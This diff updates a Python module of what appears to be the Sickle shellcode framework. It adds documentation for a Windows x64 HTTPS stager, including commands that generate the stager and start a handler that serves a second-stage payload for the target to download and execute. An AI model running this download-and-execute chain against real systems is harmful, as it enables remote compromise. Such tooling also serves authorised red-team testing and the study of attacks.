@@ -1,5 +1,4 @@
 import sys
-import math
 import ctypes
 import struct
 
@@ -27,7 +26,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/virtualalloc_exec_https"
 
-    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.50.210 LPORT=443 -f c"
 
     ring = 3
 
@@ -35,9 +34,23 @@ class Shellcode():
 
     tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = ("")
+    summary = ("A lightweight stager that connects to a handler over HTTPS to receive and execute shellcode")
 
-    description = ("")
+    description = ("This shellcode stub connects to a remote server handler over HTTPS, downloads a second-stage"
+                   " payload, and executes it. You can generate this initial stager using the following syntax."
+                   "\n\n"
+
+                   f"    {sys.argv[0]} -p {module} LHOST=192.168.50.210 LPORT=443 -f c"
+
+                   "\n\n"
+
+                   "Sickle can be used to start a handler as shown below:\n\n"
+
+                   f"    {sys.argv[0]} -m handler -p windows/x64/reflective_pe_loader EXE=/tmp/payload.exe "
+                   "HANDLER=https SRVHOST=192.168.50.210 SRVPORT=443\n\n"
+
+                   "Upon execution of the first stage, you should get a connection from the target on your handler"
+                   "and the second stage should begin executing on the target machine")
 
     arguments = {}
     arguments["LHOST"] = {}
